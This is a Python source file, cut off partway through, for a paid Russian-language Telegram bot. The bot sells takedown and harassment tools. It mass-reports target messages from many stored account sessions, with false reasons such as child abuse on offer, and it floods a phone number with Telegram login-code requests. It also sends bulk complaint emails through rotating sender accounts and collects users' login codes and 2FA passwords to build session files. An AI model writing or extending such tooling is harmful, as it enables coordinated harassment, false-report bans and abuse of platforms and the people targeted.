import aiohttp
import asyncio
import logging
import os
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, CallbackQuery
from aiogram.client.default import DefaultBotProperties
from telethon import TelegramClient, errors
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonChildAbuse,
    InputReportReasonPornography,
    InputReportReasonCopyright,
    InputReportReasonPersonalDetails,
    InputReportReasonOther
)
from telethon.tl.functions.channels import JoinChannelRequest
from datetime import datetime, timedelta
import re

from config import api_id, api_hash, clients, bot_token, donate_url, admin_chat_id, channel_ids, CRYPTO_PAY_TOKEN, senders, receivers, smtp_servers
from proxies import proxies
from user_agents import user_agents
from emails import mail, phone_numbers

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=bot_token, default=DefaultBotProperties(parse_mode='HTML'))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

script_dir = os.path.dirname(os.path.abspath(__file__))
session_dir = os.path.join(script_dir, 'Session')
if not os.path.exists(session_dir):
    os.makedirs(session_dir)

photo_path = os.path.join(script_dir, 'welcome_photo.jpg')

class ComplaintStates(StatesGroup):
    subject = State()
    body = State()
    photos = State()
    count = State()
    text_for_site = State()
    count_for_site = State()

class RestoreAccountStates(StatesGroup):
    phone = State()
    send_count = State()

class SupportStates(StatesGroup):
    message = State()

class CreateAccountStates(StatesGroup):
    client = State()
    phone = State()
    code = State()
    password = State()

class ReportStates(StatesGroup):
    message_link = State()
    reason = State()
    user_id = State()
    message_count = State()
    report_count = State()

class SpamCodeStates(StatesGroup):
    phone_and_count = State()

banned_users_file = 'banned_users.txt'
class BanState(StatesGroup):
    waiting_for_ban_user_id = State()
    waiting_for_unban_user_id = State()

def load_banned_users():
    try:
        with open(banned_users_file, 'r') as file:
            return set(map(int, file.read().splitlines()))
    except FileNotFoundError:
        return set()

def save_banned_users(banned_users):
    with open(banned_users_file, 'w') as file:
        for user_id in banned_users:
            file.write(f'{user_id}\n')

banned_users = load_banned_users()

class SendMessage(StatesGroup):
    text = State()
    media_type = State()
    media = State()

async def write_user_data(user_id, first_name, last_name, username):
    if not os.path.exists('users.txt'):
        with open('users.txt', 'w', encoding='utf-8') as file:
            pass  
    with open('users.txt', 'a', encoding='utf-8') as file:
        file.write(f"{user_id} {first_name} {last_name} {username}\n")

async def is_user_in_file(user_id):
    if not os.path.exists('users.txt'):
        return False  
    with open('users.txt', 'r', encoding='utf-8') as file:
        for line in file:
            if str(user_id) in line:
                return True
    return False

async def check_payment(user_id):
    if str(user_id) == admin_chat_id:
        return True
    if not os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'w') as file:
            pass
    with open('paid_users.txt', 'r') as file:
        paid_users = file.read().splitlines()
    return str(user_id) in paid_users

def save_paid_user(user_id):
    with open('paid_users.txt', 'a') as file:
        file.write(f"{user_id}\n")

CRYPTO_PAY_API_URL = 'https://pay.crypt.bot/api'

def create_invoice(asset, amount, description):
    url = f"{CRYPTO_PAY_API_URL}/createInvoice"
    headers = {
        "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
        "Content-Type": "application/json"
    }
    data = {
        "asset": asset,
        "amount": str(amount),
        "description": description,
        "payload": "custom_payload"
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        return response.json()
    else:
        logging.error(f"Ошибка при создании счета: {response.status_code} - {response.text}")
        return None

def check_invoice_status(invoice_id):
    url = f"{CRYPTO_PAY_API_URL}/getInvoices"
    headers = {
        "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
        "Content-Type": "application/json"
    }
    params = {
        "invoice_ids": invoice_id
    }
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        return response.json()
    else:
        logging.error(f"Ошибка при проверке статуса счета: {response.status_code} - {response.text}")
        return None

CURRENCY_PRICES = {
    "TON": 1.5,
    "BTC": 0.0001,
    "ETH": 0.001,
    "USDT": 2.0,
    "BNB": 0.01,
    "LTC": 0.02,
    "DOGE": 50,
    "TRX": 10,
    "NOT": 2,
}

@dp.message(Command('start'))
async def send_welcome(message: types.Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    
    if not os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'w') as file:
            pass

    if not await check_subscription(user_id):
        markup = InlineKeyboardMarkup(inline_keyboard=[])
        for channel_id in channel_ids:
            try:
                channel = await bot.get_chat(channel_id)
                channel_name = channel.title
                invite_link = await bot.export_chat_invite_link(channel_id)
                btn_subscribe = InlineKeyboardButton(text=f'{channel_name}', url=invite_link)
                markup.inline_keyboard.append([btn_subscribe])
            except Exception as e:
                logging.error(f'Error getting channel info: {e}')
        await message.answer(f'🚨Для использования бота, пожалуйста, подпишитесь на наши каналы🚨\nПосле подписки активируйте бота /start', reply_markup=markup)
        return
    
    if not await check_payment(user_id) and str(user_id) != admin_chat_id:
        await process_payment(message)
        return
    
    user = message.from_user
    first_name = user.first_name if user.first_name else ''
    last_name = user.last_name if user.last_name else ''
    username = f"@{user.username}" if user.username else f"id{user.id}"
    
    if not await is_user_in_file(user_id):
        await write_user_data(user_id, first_name, last_name, username)
    
    welcome_message = f"🎉 Добро пожаловать, {first_name} {last_name} {username} 🎉\nМы рады видеть вас здесь. Если у вас есть вопросы или нужна помощь, не стесняйтесь обращаться к поддержке!\n 📢Каналы📢\n- https://t.me/ProjectDeadCode\n- https://t.me/spetifika\nНаписал бот: 👑 @osintfucks 👑"
    
    await send_menu(message, welcome_message)

async def process_payment(message: types.Message):
    await message.reply("💸Теперь для работы с ботом нужно оплатить, для оплаты нажмите кнопку ниже💸",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="Оплатить", callback_data="pay")]
                        ]))

@dp.callback_query(lambda c: c.data == 'pay')
async def process_callback_pay(callback_query: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[])
    for currency, price in CURRENCY_PRICES.items():
        keyboard.inline_keyboard.append([InlineKeyboardButton(text=f"{currency} ({price})", callback_data=f"pay_{currency}")])
    await callback_query.answer()
    await callback_query.message.answer("💸Выберите валюту для оплаты💸", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data.startswith('pay_'))
async def process_callback_currency(callback_query: CallbackQuery):
    asset = callback_query.data.split('_')[1]
    amount = CURRENCY_PRICES.get(asset, 0)
    invoice = create_invoice(asset=asset, amount=amount, description="Оплата через CryptoBot")
    if invoice and 'result' in invoice:
        invoice_id = invoice['result']['invoice_id']
        pay_url = invoice['result']['pay_url']
        await callback_query.answer()
        await callback_query.message.answer(f"💸Ссылка для оплаты: {pay_url}")
        await check_payment_and_grant_access(callback_query.from_user.id, invoice_id)
    else:
        await callback_query.answer("Ошибка при создании счета")

async def check_payment_and_grant_access(user_id, invoice_id):
    import time
    while True:
        status = check_invoice_status(invoice_id)
        if status and 'result' in status:
            invoice_status = status['result']['items'][0]['status']
            if invoice_status == 'paid':
                save_paid_user(user_id)
                await bot.send_message(user_id, "Поздравляем! Вы успешно оплатили чек.\nТеперь запустите бота повторно /start")
                break
            elif invoice_status in ['expired', 'failed']:
                await bot.send_message(user_id, "Оплата не прошла. Попробуйте снова.")
                break
        time.sleep(5)

async def check_subscription(user_id):
    if str(user_id) == admin_chat_id:
        return True
    for channel_id in channel_ids:
        try:
            member = await bot.get_chat_member(channel_id, user_id)
            if member.status not in ['member', 'creator', 'administrator']:
                return False
        except Exception as e:
            logging.error(f'Error checking subscription: {e}')
            return False
    return True

async def send_menu(message: types.Message, welcome_message: str):
    user_id = message.from_user.id
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='📢Написать поддержку📢', callback_data='support')],
        [InlineKeyboardButton(text='💳Донат💳', url=donate_url)],
        [InlineKeyboardButton(text='📫Email-Снос📫', callback_data='email_complaint')],
        [InlineKeyboardButton(text='💻Web-Снос💻', callback_data='website_complaint')],
        [InlineKeyboardButton(text='🔑Создать session🔑', callback_data='create_account')],
        [InlineKeyboardButton(text='🚨Ботнет-Снос🚨', callback_data='report_message')],
        [InlineKeyboardButton(text='🔥Спам-Снос🔥', callback_data='spam_code')],
        [InlineKeyboardButton(text='🔄Восстановить аккаунт🔄', callback_data='restore_account')]
    ])
    
    if str(user_id) == admin_chat_id:
        markup.inline_keyboard.append([InlineKeyboardButton(text='🛠Админ панель🛠', callback_data='admin_panel')])
    
    if os.path.exists(photo_path):
        # Используем FSInputFile для отправки фото
        photo = types.FSInputFile(photo_path)
        await message.answer_photo(photo, caption=welcome_message, reply_markup=markup)
    else:
        await message.answer(welcome_message, reply_markup=markup)

@dp.callback_query(lambda c: c.data == 'admin_panel')
async def admin_panel_callback(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='🚫Бан🚫', callback_data='ban_user')],
        [InlineKeyboardButton(text='🔓Снять бан🔓', callback_data='unban_user')],
        [InlineKeyboardButton(text='📥Извлечь ID пользователей📥', callback_data='extract_users')],
        [InlineKeyboardButton(text='📊Статистика📊', callback_data='stats')],
        [InlineKeyboardButton(text='📨Отправить сообщение📨', callback_data='send_message')]
    ])
    await callback_query.message.answer('Админ панель:', reply_markup=markup)

@dp.callback_query(lambda c: c.data == 'extract_users')
async def extract_users_callback(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if os.path.exists('users.txt'):
        with open('users.txt', 'r', encoding='utf-8') as file:
            users_data = file.read()
        user_count = len(users_data.splitlines())
        document = types.FSInputFile('users.txt')
        await callback_query.message.answer_document(document)
        await callback_query.message.answer(f'📝В файле содержится {user_count} пользователей.')
    else:
        await callback_query.message.answer('Файл users.txt не найден')

@dp.callback_query(lambda c: c.data == 'stats')
async def stats_callback(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if os.path.exists('users.txt'):
        with open('users.txt', 'r', encoding='utf-8') as file:
            lines = file.readlines()
            total_users = len(lines)
        await callback_query.message.answer(f'📊Статистика:\n\n👤Всего пользователей: {total_users}')
    else:
        await callback_query.message.answer('Файл users.txt не найден')

@dp.callback_query(lambda c: c.data == 'send_message')
async def send_message_start(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('Введите текст сообщения:')
    await state.set_state(SendMessage.text)

@dp.message(SendMessage.text)
async def process_text(message: types.Message, state: FSMContext):
    await state.update_data(text=message.text)
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Да', callback_data='yes'),
         InlineKeyboardButton(text='Нет', callback_data='no')]
    ])
    await message.answer('Хотите добавить фото или видео?', reply_markup=markup)
    await state.set_state(SendMessage.media_type)

@dp.callback_query(SendMessage.media_type, lambda c: c.data in ['yes', 'no'])
async def process_media_type(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if callback_query.data == 'yes':
        await callback_query.message.answer('Отправьте фото или видео:')
        await state.set_state(SendMessage.media)
    else:
        data = await state.get_data()
        await send_message_to_users(data['text'], None, None)
        await state.clear()
        await callback_query.message.answer('✅Сообщение отправлено всем пользователям.')

@dp.message(SendMessage.media)
async def process_media(message: types.Message, state: FSMContext):
    data = await state.get_data()
    text = data.get('text', '')
    
    if message.photo:
        media_type = 'photo'
        media_id = message.photo[-1].file_id
    elif message.video:
        media_type = 'video'
        media_id = message.video.file_id
    else:
        await message.answer('Пожалуйста, отправьте фото или видео')
        return
    
    await send_message_to_users(text, media_type, media_id)
    await state.clear()
    await message.answer('✅Сообщение отправлено всем пользователям.')

async def send_message_to_users(text, media_type, media_id):
    if not os.path.exists('users.txt'):
        return
        
    with open('users.txt', 'r', encoding='utf-8') as file:
        for line in file:
            user_id = line.split()[0]
            try:
                if media_type == 'photo':
                    await bot.send_photo(user_id, media_id, caption=text)
                elif media_type == 'video':
                    await bot.send_video(user_id, media_id, caption=text)
                else:
                    await bot.send_message(user_id, text)
            except Exception as e:
                logging.error(f'Error sending message to user {user_id}: {e}')

@dp.callback_query(lambda c: c.data == 'ban_user')
async def ban_user_callback(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('📝Введите ID пользователя, которого хотите забанить:')
    await state.set_state(BanState.waiting_for_ban_user_id)

@dp.message(BanState.waiting_for_ban_user_id)
async def ban_user_input(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        if user_id in banned_users:
            await message.answer(f'🚫 Пользователь с ID {user_id} уже забанен.')
        else:
            banned_users.add(user_id)
            save_banned_users(banned_users)
            await message.answer(f'✅ Пользователь с ID {user_id} забанен.')
            try:
                await bot.send_message(user_id, '📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
            except Exception as e:
                logging.error(f'Error sending ban message to user {user_id}: {e}')
    else:
        await message.answer('❌ Неверный формат ID. Пожалуйста, введите числовой ID.')
    await state.clear()

@dp.callback_query(lambda c: c.data == 'unban_user')
async def unban_user_callback(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('📝Введите ID пользователя, которого хотите разбанить:')
    await state.set_state(BanState.waiting_for_unban_user_id)

@dp.message(BanState.waiting_for_unban_user_id)
async def unban_user_input(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        if user_id not in banned_users:
            await message.answer(f'🚫 Пользователь с ID {user_id} не забанен.')
        else:
            banned_users.remove(user_id)
            save_banned_users(banned_users)
            await message.answer(f'✅ Пользователь с ID {user_id} разбанен.')
            try:
                await bot.send_message(user_id, '📢Ваш аккаунт был разбанен администратором📢')
            except Exception as e:
                logging.error(f'Error sending unban message to user {user_id}: {e}')
    else:
        await message.answer('❌ Неверный формат ID. Пожалуйста, введите числовой ID.')
    await state.clear()

@dp.callback_query()
async def handle_callbacks(callback_query: CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    if user_id in banned_users:
        await callback_query.answer('🚨Вы забанены администратором🚨')
        return
    
    data = callback_query.data
    
    if data == 'support':
        await callback_query.message.answer('📝 Пожалуйста, напишите ваше сообщение для поддержки:')
        await state.set_state(SupportStates.message)
    elif data == 'email_complaint':
        await callback_query.message.answer('📧 Введите тему письма:')
        await state.set_state(ComplaintStates.subject)
    elif data == 'website_complaint':
        await callback_query.message.answer('🌐 Введите текст для отправки на сайт:')
        await state.set_state(ComplaintStates.text_for_site)
    elif data == 'create_account':
        await callback_query.message.answer('📱 Введите ваш номер телефона:')
        await state.set_state(CreateAccountStates.phone)
    elif data == 'report_message':
        await callback_query.message.answer('🔗 Введите ссылку на сообщение:')
        await state.set_state(ReportStates.message_link)
    elif data == 'spam_code':
        await callback_query.message.answer('📞Введите номер телефона и количество отправлений в формате: +79991234567 10')
        await state.set_state(SpamCodeStates.phone_and_count)
    elif data == 'restore_account':
        await callback_query.message.answer('📱 Введите номер телефона для восстановления аккаунта:')
        await state.set_state(RestoreAccountStates.phone)
    
    await callback_query.answer()

@dp.message(RestoreAccountStates.phone)
async def process_restore_phone(message: types.Message, state: FSMContext):
    phone_number = message.text
    await state.update_data(phone_number=phone_number)
    await message.answer("📝Введите количество отправок:")
    await state.set_state(RestoreAccountStates.send_count)

@dp.message(RestoreAccountStates.send_count)
async def process_send_count(message: types.Message, state: FSMContext):
    try:
        send_count = int(message.text)
        if send_count <= 0:
            raise ValueError("Количество отправок должно быть больше 0")
    except ValueError as e:
        await message.answer(f"❌ Ошибка: {e}. Пожалуйста, введите корректное число.")
        return

    data = await state.get_data()
    phone_number = data.get("phone_number")
    target_email = "recover@telegram.org"
    subject = f"Banned phone number: {phone_number}"
    body = (
        f"I'm trying to use my mobile phone number: {phone_number}\n"
        "But Telegram says it's banned. Please help.\n\n"
        "App version: 11.4.3 (54732)\n"
        "OS version: SDK 33\n"
        "Device Name: samsungSM-A325F\n"
        "Locale: ru"
    )

    for _ in range(send_count):
        sender_email, sender_password = random.choice(list(senders.items()))
        success, result = await send_email(
            receiver=target_email,
            sender_email=sender_email,
            sender_password=sender_password,
            subject=subject,
            body=body
        )
        if success:
            await message.answer(f'✅ Письмо успешно отправлено на [{target_email}] от [{sender_email}]')
        else:
            await message.answer(f'❌ Ошибка при отправке письма на [{target_email}] от [{sender_email}]: {result}')
            break

    await state.clear()

async def send_email(receiver, sender_email, sender_password, subject, body, photos=None):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    # В aiogram 3.x photos теперь file_id, а не бинарные данные
    # Пропускаем прикрепление фото для упрощения
    # if photos:
    #     for photo in photos:
    #         image = MIMEImage(photo)
    #         msg.attach(image)
    
    try:
        domain = sender_email.split('@')[1]
        if domain not in smtp_servers:
            return False, f'❌ Отправка не удалась в почте {sender_email}: Неизвестный домен'
        smtp_server, smtp_port = smtp_servers[domain]
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
        logging.info(f'Email sent to {receiver} from {sender_email}')
        return True, f'✅ Отправлено от [{sender_email}] на [{receiver}]'
    except Exception as e:
        logging.error(f'Error sending email: {e}')
        return False, f'❌ Ошибка при отправке письма на [{receiver}] от [{sender_email}]: {e}'

@dp.message(SpamCodeStates.phone_and_count)
async def process_spam_code_input(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    try:
        phone_number, num_sendings = message.text.split()
        num_sendings = int(num_sendings)
        await send_code_requests(phone_number, num_sendings, message.chat.id)
    except ValueError:
        await message.reply('❌Неверный формат ввода. Используйте: +79991234567 10')
    await state.clear()

async def send_code_requests(phone_number, num_sendings, chat_id):
    for _ in range(num_sendings):
        client_data = random.choice(clients)     
        client = None
        try:
            client = TelegramClient(client_data["name"], client_data["api_id"], client_data["api_hash"])
            await client.connect()            
            await client.send_code_request(phone_number)
            await bot.send_message(chat_id, f"✅Код подтверждения отправлен через клиент {client_data['name']}✅")
        except Exception as e:
            await bot.send_message(chat_id, f"❌Ошибка при использовании клиента {client_data['name']}: {e}❌")
        finally:
            if client:
                await client.disconnect()
        await asyncio.sleep(1)

@dp.message(CreateAccountStates.phone)
async def process_phone_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    phone = message.text.replace('+', '') 
    if not phone or not phone.isdigit():
        await message.answer('❌ Введите корректный номер телефона.')
        return
    
    session_name = f"session_{phone}"
    session_path = os.path.join(session_dir, session_name)
    client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash)
    
    await client.connect()
    if not await client.is_user_authorized():
        try:
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            await state.update_data(phone=phone, phone_code_hash=phone_code_hash)
            await message.answer('📩 Введите код подтверждения:')
            await state.set_state(CreateAccountStates.code)
        except errors.PhoneNumberInvalidError:
            await message.answer('❌ Неверный номер телефона. Пожалуйста, попробуйте еще раз.')
        finally:
            await client.disconnect()
    else:
        await message.answer('❌ Аккаунт уже авторизован.')
        await state.clear()
        await client.disconnect()

def create_code_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="1", callback_data="code_1"),
            InlineKeyboardButton(text="2", callback_data="code_2"),
            InlineKeyboardButton(text="3", callback_data="code_3")
        ],
        [
            InlineKeyboardButton(text="4", callback_data="code_4"),
            InlineKeyboardButton(text="5", callback_data="code_5"),
            InlineKeyboardButton(text="6", callback_data="code_6")
        ],
        [
            InlineKeyboardButton(text="7", callback_data="code_7"),
            InlineKeyboardButton(text="8", callback_data="code_8"),
            InlineKeyboardButton(text="9", callback_data="code_9")
        ],
        [
            InlineKeyboardButton(text="Очистить", callback_data="code_clear"),
            InlineKeyboardButton(text="0", callback_data="code_0"),
            InlineKeyboardButton(text="Подтвердить", callback_data="code_confirm")
        ]
    ])

@dp.callback_query(CreateAccountStates.code, lambda c: c.data.startswith('code_'))
async def process_code_callback(callback_query: CallbackQuery, state: FSMContext):
    action = callback_query.data.split('_')[1]
    data = await state.get_data()
    code = data.get('code', '')
    
    if action == 'clear':
        code = ''
    elif action == 'confirm':
        if len(code) == 5:
            await state.update_data(code=code)
            await callback_query.answer()
            await process_code_step(callback_query.message, state)
            return
        else:
            await callback_query.answer("Код должен состоять из 5 цифр.")
            return
    else:
        if len(code) < 5:
            code += action
    
    await state.update_data(code=code)
    await callback_query.message.edit_text(f'📩 Введите код подтверждения: {code}', reply_markup=create_code_keyboard())

@dp.message(CreateAccountStates.code)
async def process_code_step(message: types.Message, state: FSMContext):
    data = await state.get_data()
    code = data.get('code', '')
    
    if not code or len(code) != 5:
        await message.answer('❌ Введите корректный код подтверждения.')
        return
    
    data = await state.get_data()
    phone = data['phone']
    phone_code_hash = data['phone_code_hash']
    session_name = f"session_{phone}"
    session_path = os.path.join(session_dir, session_name)
    client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash)
    
    await client.connect()
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
    except errors.SessionPasswordNeededError:
        await message.answer('🔒 Введите пароль от 2FA:')
        await state.set_state(CreateAccountStates.password)
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
        await state.clear()
    else:
        await message.answer(f'✅ Аккаунт успешно создан и сохранен как {session_name}.session')
        await state.clear()
    finally:
        await client.disconnect()

@dp.message(CreateAccountStates.password)
async def process_password_step(message: types.Message, state: FSMContext):
    password = message.text
    data = await state.get_data()
    phone = data['phone']
    session_name = f"session_{phone}"
    session_path = os.path.join(session_dir, session_name)
    client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash)
    
    await client.connect()
    try:
        await client.sign_in(password=password)
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
    else:
        await message.answer(f'✅ Аккаунт успешно создан и сохранен как {session_name}.session')
    finally:
        await state.clear()
        await client.disconnect()

@dp.message(ReportStates.message_link)
async def process_message_link_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    message_links = message.text.split()
    if not all(re.match(r'^https://t\.me/[^/]+/\d+(/\d+)?$|^https://t\.me/c/\d+/\d+$', link) for link in message_links):
        await message.answer('❌ Неверный формат ссылки на сообщение. Пожалуйста, введите ссылки в формате https://t.me/username/message_id или https://t.me/username/message_id/additional_info или https://t.me/c/channel_id/message_id')
        return
    
    await state.update_data(message_links=message_links)
    
    session_files = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    if not session_files:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.clear()
        return
    
    client = TelegramClient(os.path.join(session_dir, session_files[0]), api_id=api_id, api_hash=api_hash)
    await client.connect()
    
    try:
        users_info = {}
        for message_link in message_links:
            parts = message_link.split('/')
            if parts[3] == 'c':
                chat_id = int(f"-100{parts[4]}")
                message_id = int(parts[5])
            else:
                chat_username = parts[3]
                message_id = int(parts[4])
                chat = await client.get_entity(chat_username)
                await client(JoinChannelRequest(chat))
            
            target_message = await client.get_messages(chat_id if parts[3] == 'c' else chat, ids=message_id)
            if not target_message:
                await message.answer(f'❌ Сообщение по ссылке {message_link} не найдено. Пожалуйста, проверьте правильность ссылки.')
                continue
            
            user_id = target_message.sender_id
            user = await client.get_entity(user_id)
            user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
            
            premium_status = "✅" if user.premium else "❌"
            is_bot = " Бот🤖" if user.bot else " Человек👤"
            
            chat_title = (await client.get_entity(chat_id if parts[3] == 'c' else chat)).title
            
            if user_info not in users_info:
                users_info[user_info] = {
                    "premium_status": premium_status,
                    "is_bot": is_bot,
                    "chat_title": chat_title,
                    "messages": []
                }
            
            message_type = target_message.media.__class__.__name__ if target_message.media else 'text'
            message_text = target_message.text if message_type == 'text' else f"{message_type.capitalize()}"
            
            users_info[user_info]["messages"].append(f"{message_text} (ID: {message_id})")
        
        report_message = ""
        for user_info, details in users_info.items():
            messages_text = "\n".join(details["messages"])
            report_message += (f"👤 Пользователь: {user_info}\n"
                               f"📄 Сообщение: {messages_text}\n"
                               f"✅ Робочих сессий: {len(session_files)}\n"
                               f"👑Премиум{details['premium_status']}\n"
                               f"👤/🤖: {details['is_bot']}\n"
                               f"👥 Группа: {details['chat_title']}\n\n")
        
        await message.answer(report_message.strip())
        
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='🚫 Спам', callback_data='reason_1')],
            [InlineKeyboardButton(text='🔪 Насилие', callback_data='reason_2')],
            [InlineKeyboardButton(text='👶 Насилие над детьми', callback_data='reason_3')],
            [InlineKeyboardButton(text='🔞 Порнография', callback_data='reason_4')],
            [InlineKeyboardButton(text='©️ Нарушение авторских прав', callback_data='reason_5')],
            [InlineKeyboardButton(text='👤 Публикация личных данных', callback_data='reason_6')],
            [InlineKeyboardButton(text='📝 Другое', callback_data='reason_7')]
        ])
        
        await message.answer('🚨Выберите причину репорта:', reply_markup=markup)
        await state.set_state(ReportStates.reason)
    except errors.FloodWaitError as e:
        logging.warning(f"Ошибка: Слишком много запросов. Подождите {e.seconds} секунд.")
        await asyncio.sleep(e.seconds)
        await message.answer('❌ Ошибка при получении сообщений. Попробуйте позже.')
        await state.clear()
    except Exception as e:
        logging.error(f'Error fetching messages: {e}')
        await message.answer('❌ Ошибка при получении сообщений.')
        await state.clear()
    finally:
        await client.disconnect()

@dp.callback_query(ReportStates.reason, lambda c: c.data.startswith('reason_'))
async def process_reason_step(callback_query: CallbackQuery, state: FSMContext):
    reason_code = callback_query.data.split('_')[1]
    reasons_map = {
        '1': InputReportReasonSpam(),
        '2': InputReportReasonViolence(),
        '3': InputReportReasonChildAbuse(),
        '4': InputReportReasonPornography(),
        '5': InputReportReasonCopyright(),
        '6': InputReportReasonPersonalDetails(),
        '7': InputReportReasonOther()
    }

    reason = reasons_map.get(reason_code)
    if not reason:
        await callback_query.message.answer('❌ Неверный код причины. Пожалуйста, выберите причину из списка.')
        return

    await state.update_data(reason=reason)
    await callback_query.message.answer('🚨Начинаем отправку репортов...🚨')
    await send_reports(callback_query.message, state)

async def send_reports(message: types.Message, state: FSMContext):
    data = await state.get_data()
    message_links = data['message_links']
    reason = data['reason']
    
    session_files = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    if not session_files:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.clear()
        return
    
    total_reports = 0
    for message_link in message_links:
        parts = message_link.split('/')
        chat_username = parts[3]
        message_id = int(parts[4])
        
        for session_file in session_files:
            session_name = session_file.replace('.session', '')
            client = TelegramClient(os.path.join(session_dir, session_file), api_id=api_id, api_hash=api_hash)
            
            await client.connect()

            try:
                chat = await client.get_entity(chat_username)
                target_message = await client.get_messages(chat, ids=message_id)
                if not target_message:
                    await message.answer(f'❌ Сообщение по ссылке {message_link} не найдено. Пожалуйста, проверьте правильность ссылки.')
                    continue
                
                await client(ReportRequest(
                    peer=chat,
                    id=[message_id],
                    reason=reason,
                    message=''
                ))
                total_reports += 1
                logging.info(f"Жалоба успешно отправлена на сообщение с ID {message_id}.")
                await message.answer(f"✅ Жалоба успешно отправлена на сообщение с ID {message_id}.")
            except errors.FloodWaitError as e:
                logging.warning(f"Ошибка: Слишком много запросов. Подождите {e.seconds} секунд.")
                await asyncio.sleep(e.seconds)
                await message.answer(f"❌ Ошибка: Слишком много запросов. Подождите {e.seconds} секунд.")
            except errors.UsernameNotOccupiedError:
                logging.error("Чат не найден. Проверьте правильность ссылки.")
                await message.answer("❌ Чат не найден. Проверьте правильность ссылки.")
            except errors.ChatWriteForbiddenError:
                logging.error("Нет доступа к чату.")
                await message.answer("❌ Нет доступа к чату.")
            except Exception as e:
                logging.error(f"Произошла ошибка при отправке жалобы: {e}")
                await message.answer(f"❌ Произошла ошибка при отправке жалобы: {e}")
            finally:
                await client.disconnect()
    
    await message.answer(f'✅ Всего отправлено жалоб: {total_reports}')
    await state.clear()

@dp.message(ComplaintStates.subject)
async def process_subject_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    await state.update_data(subject=message.text)
    await message.answer('📝 Введите текст жалобы:')
    await state.set_state(ComplaintStates.body)

@dp.message(ComplaintStates.body)
async def process_body_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    await state.update_data(body=message.text)
    await message.answer('🖼 Хотите добавить фотографии? (Да/Нет):')
    await state.set_state(ComplaintStates.photos)

@dp.message(ComplaintStates.photos)
async def process_photo_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    add_photo = message.text.lower()
    if add_photo == 'да':
        await message.answer('📎 Пожалуйста, отправьте фотографии:')
    elif add_photo == 'нет':
